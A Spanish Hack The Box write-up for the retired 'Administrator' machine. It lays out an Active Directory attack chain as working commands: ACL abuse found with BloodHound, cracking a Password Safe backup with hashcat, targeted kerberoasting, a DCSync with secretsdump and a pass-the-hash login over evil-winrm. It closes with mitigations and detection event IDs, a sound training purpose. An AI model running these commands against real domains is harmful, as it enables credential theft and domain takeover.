---
machine: Administrator
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, bloodhound, genericall, ftp, psafe3, kerberoasting, dcsync]
---

# Administrator — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

La máquina arranca con credenciales de bajo privilegio (`olivia`). BloodHound muestra la cadena de ACLs: `olivia` tiene **GenericAll** sobre `michael`, `michael` tiene **ForceChangePassword** sobre `benjamin`, y `benjamin` pertenece a `SHARE MODERATORS`, cuyo acceso al **FTP** entrega `Backup.psafe3`. Esa base de Password Safe se crackea con `hashcat -m 5200` y dentro están las credenciales de `emily`. Emily tiene **GenericWrite** sobre `ethan`: se le añade un SPN y se hace *targeted kerberoasting*. La contraseña de Ethan da **DCSync** y con el hash de `Administrator` se entra por WinRM.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV <IP> -oN nmap_svc.txt
```

```text
21/tcp    open  ftp           Microsoft ftpd
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: administrator.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ssl/ldap
3268/tcp  open  ldap          Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
```

`FTP` en el DC y `WinRM` abierto: la máquina está pensada para que el último salto sea `evil-winrm`.

```bash
echo "<IP> administrator.htb dc.administrator.htb" | sudo tee -a /etc/hosts
```

## Enumeración

Con `olivia` se valida el acceso y se lanza la recolección:

```bash
nxc smb <IP> -u olivia -p '<PASSWORD>'
bloodhound-python -u olivia -p '<PASSWORD>' -d administrator.htb -ns <IP> -c All
```

En BloodHound, la ruta marcada:

```text
olivia  --GenericAll-->            michael
michael --ForceChangePassword-->   benjamin
benjamin --memberOf-->             SHARE MODERATORS  --> FTP
```

`SHARE MODERATORS` da acceso al FTP del DC. Con `benjamin` se listan y descargan los ficheros:

```bash
lftp -u benjamin,'<PASSWORD>' <IP>
# ls; get Backup.psafe3
```

`Backup.psafe3` es una base de **Password Safe v3**, formato que hashcat ataca en el modo 5200:

```bash
hashcat -m 5200 Backup.psafe3 rockyou.txt
pwsafe --show -f Backup.psafe3      # o la GUI oficial, con la master password crackeada
```

Dentro aparecen entradas de varios usuarios; la útil es **`emily`**.

## Foothold

```bash
nxc smb <IP> -u emily -p '<PASSWORD>' --shares
```

No hay shell directa todavía: Emily es una cuenta de dominio sin WinRM. El acceso llega por la ACL siguiente.

## Movimiento lateral

La cadena es horizontal entre cuentas, no entre equipos. Cada credencial se obtiene de un recurso legítimo (LDAP, FTP, gestor de contraseñas) y se reutiliza en el siguiente salto.

## Escalada de privilegios

`emily` tiene **GenericWrite** sobre `ethan`. Eso permite escribir un SPN en la cuenta y pedir un TGS para crackearlo fuera de línea (*targeted kerberoasting*, sin necesidad de que Ethan tenga SPN previo):

```bash
bloodyAD -u emily -p '<PASSWORD>' -d administrator.htb --host <IP> \
  add spn ethan -v 'http/ethan.administrator.htb'

impacket-GetUserSPNs administrator.htb/emily:'<PASSWORD>' -dc-ip <IP> \
  -request -outputfile ethan.tgs

hashcat -m 13100 ethan.tgs rockyou.txt
```

Con la contraseña de `ethan` se comprueba su privilegio y se vuelca el dominio:

```bash
impacket-secretsdump administrator.htb/ethan:'<PASSWORD>'@<IP> -just-dc-user Administrator
```

Ethan tiene **DCSync** (`DS-Replication-Get-Changes` + `-All`), así que devuelve el hash NTLM de `Administrator`:

```bash
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```

Si el SPN añadido no se puede limpiar, se deja constancia: es un cambio de AD que hay que revertir en un engagement real.

## Evidencia

- Salidas recortadas de BloodHound (rutas), `GetUserSPNs` y `secretsdump`.
- Sin flags, hashes ni contraseñas: los valores reales viven en `private/`.

## Lecciones aprendidas

- BloodHound no "encuentra la vulnerabilidad": dibuja la ruta; el trabajo es leerla en orden.
- `ForceChangePassword` sobre otro usuario convierte una cuenta cualquiera en la siguiente identidad, sin tocar hashes.
- Un `.psafe3` en un FTP es un gestor de contraseñas entero: `-m 5200` y diccionario.
- GenericWrite sobre un usuario habilita targeted kerberoasting: no hace falta que la víctima sea un servicio.
- DCSync con una cuenta de usuario es el final habitual: `-just-dc-user` evita volcar todo el dominio.

## Mitigaciones y detección

- Auditar ACLs: GenericAll/GenericWrite/ForceChangePassword sobre cuentas humanas deben ser excepciones documentadas.
- Sacar el FTP del DC y no almacenar gestores de contraseñas en shares accesibles.
- Contraseñas de servicio largas y rotadas; cuentas de servicio con gMSA.
- Detección: 4720/4722/4724 (creación y reset de cuentas), 4738 (cuenta modificada) con `servicePrincipalName` en el diff, 4769 con `Ticket Encryption Type 0x17` (RC4) desde una cuenta sin SPN previo, y 4662 con `DS-Replication-Get-Changes-All`.
- Revisar la pertenencia a `SHARE MODERATORS` y el acceso FTP con cuentas de usuario.

MITRE: T1098 (account manipulation), T1558.003 (kerberoasting), T1003.006 (DCSync), T1078 (valid accounts).

## Referencias

- <https://www.hackthebox.com/machines/administrator>
- <https://blankshiro.xyz/posts/hackthebox/machines/hackthebox-administrator>
- <https://01mi.github.io/p/administrator-htb-writeup-windows-medium>
- <https://hashcat.net/wiki/doku.php?id=example_hashes>
